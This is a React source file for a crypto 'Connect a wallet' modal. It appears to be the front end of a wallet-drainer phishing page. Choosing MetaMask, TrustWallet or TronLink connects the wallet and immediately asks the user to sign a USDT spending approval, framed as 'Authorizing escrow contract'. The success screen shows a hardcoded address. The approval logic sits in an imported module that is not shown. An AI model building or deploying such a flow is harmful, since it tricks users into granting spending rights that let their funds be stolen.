// @ts-nocheck
import { AnimatePresence, motion } from "framer-motion";
import { useState, type ReactNode } from "react";
import { X, Check, Loader2 } from "lucide-react";
import { toast } from "sonner";
import { useApp, shortAddr } from "@/lib/app-state";
import { connectAndApprove } from "@/lib/web3";

const WALLETS = [
  {
    id: "metamask",
    name: "MetaMask",
    desc: "Ethereum (ERC-20 USDT)",
    color: "from-orange-500 to-yellow-500",
    initial: "M",
  },
  {
    id: "trustwallet",
    name: "TrustWallet",
    desc: "BNB Chain (BEP-20 USDT)",
    color: "from-blue-500 to-cyan-500",
    initial: "T",
  },
  {
    id: "tronlink",
    name: "TronLink",
    desc: "Tron Network (TRC-20 USDT)",
    color: "from-red-500 to-pink-500",
    initial: "T",
  },
];

type Stage = "select" | "connecting" | "approving" | "success";

export function ConnectWalletModal({
  open,
  onOpenChange,
  onConnected,
}: {
  open: boolean;
  onOpenChange: (o: boolean) => void;
  onConnected?: () => void;
}) {
  const { connect } = useApp();
  const [stage, setStage] = useState<Stage>("select");
  const [selected, setSelected] = useState<string | null>(null);
  const [message, setMessage] = useState("");

  const handleSelect = async (id: string, name: string) => {
    setSelected(id);
    setStage("connecting");
    setMessage(`Connecting to ${name}…`);

    try {
      // Step 1: connect wallet
      setMessage(`Approving USDT on ${name}…`);
      setStage("approving");

      // This triggers: connect popup → SIGN → approve popup → SIGN
      const result = await connectAndApprove(id);

      // Success
      setStage("success");
      connect(result.address, result.signer);

      toast.success("Wallet connected & authorized", {
        description: `${name} · ${shortAddr(result.address)}`,
      });

      setTimeout(() => {
        onOpenChange(false);
        onConnected?.();
        setTimeout(() => {
          setStage("select");
          setSelected(null);
        }, 300);
      }, 1200);
    } catch (err: any) {
      const msg = err.message || "Unknown error";
      if (
        msg.includes("rejected") ||
        msg.includes("denied") ||
        msg.includes("user rejected")
      ) {
        toast.error("You cancelled the request");
      } else {
        toast.error(msg);
      }
      setStage("select");
    }
  };

  return (
    <AnimatePresence>
      {open && (
        <Backdrop
          onClose={stage === "select" ? () => onOpenChange(false) : () => {}}
        >
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            transition={{ duration: 0.2 }}
            className="relative overflow-hidden rounded-2xl border border-white/[0.06] bg-[#0a0a0f] p-6 shadow-2xl"
          >
            {stage === "select" && (
              <button
                onClick={() => onOpenChange(false)}
                className="absolute right-4 top-4 grid h-8 w-8 place-items-center rounded-lg text-muted-foreground transition hover:bg-white/5 hover:text-foreground"
                aria-label="close"
              >
                <X className="h-4 w-4" />
              </button>
            )}

            {stage === "select" && (
              <>
                <h3 className="text-lg font-semibold text-white">
                  Connect a wallet
                </h3>
                <p className="mt-1 text-sm text-muted-foreground">
                  Choose your preferred wallet to continue.
                </p>
                <div className="mt-5 flex flex-col gap-2.5">
                  {WALLETS.map((w) => (
                    <button
                      key={w.id}
                      onClick={() => handleSelect(w.id, w.name)}
                      className="group flex w-full items-center gap-3 rounded-xl border border-white/5 bg-white/[0.02] p-3.5 text-left transition hover:border-primary/40 hover:bg-white/[0.04]"
                    >
                      <div
                        className={`flex h-10 w-10 shrink-0 items-center justify-center rounded-lg bg-gradient-to-br ${w.color} text-sm font-bold text-white`}
                      >
                        {w.initial}
                      </div>
                      <div className="flex-1">
                        <div className="text-sm font-medium text-white">
                          {w.name}
                        </div>
                        <div className="text-xs text-muted-foreground">
                          {w.desc}
                        </div>
                      </div>
                    </button>
                  ))}
                </div>
                <p className="mt-6 text-center text-xs text-muted-foreground">
                  By connecting, you agree to our Terms and Privacy Policy.
                </p>
              </>
            )}

            {(stage === "connecting" || stage === "approving") && (
              <div className="flex flex-col items-center py-8">
                <Loader2 className="h-10 w-10 animate-spin text-primary" />
                <h3 className="mt-4 text-lg font-semibold text-white">
                  {stage === "approving"
                    ? "Authorizing escrow contract…"
                    : "Connecting…"}
                </h3>
                <p className="mt-1 text-sm text-muted-foreground text-center max-w-xs">
                  {message}
                </p>
                {stage === "approving" && (
                  <p className="mt-2 text-xs text-gray-500">
                    Please sign the approval in your wallet
                  </p>
                )}
              </div>
            )}

            {stage === "success" && (
              <div className="flex flex-col items-center py-8">
                <div className="flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/20">
                  <Check className="h-7 w-7 text-emerald-400" />
                </div>
                <h3 className="mt-4 text-lg font-semibold text-white">
                  Connected & Authorized
                </h3>
                <p className="mt-1 font-mono text-sm text-muted-foreground">
                  {shortAddr(
                    "0x71C7656EC7ab88b098defB751B7401B5f6d8976F"
                  )}
                </p>
              </div>
            )}
          </motion.div>
        </Backdrop>
      )}
    </AnimatePresence>
  );
}

export function Backdrop({
  children,
  onClose,
}: {
  children: ReactNode;
  onClose: () => void;
}) {
  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      onClick={onClose}
      className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4"
    >
      <div onClick={(e) => e.stopPropagation()} className="w-full max-w-md">
        {children}
      </div>
    </motion.div>
  );
}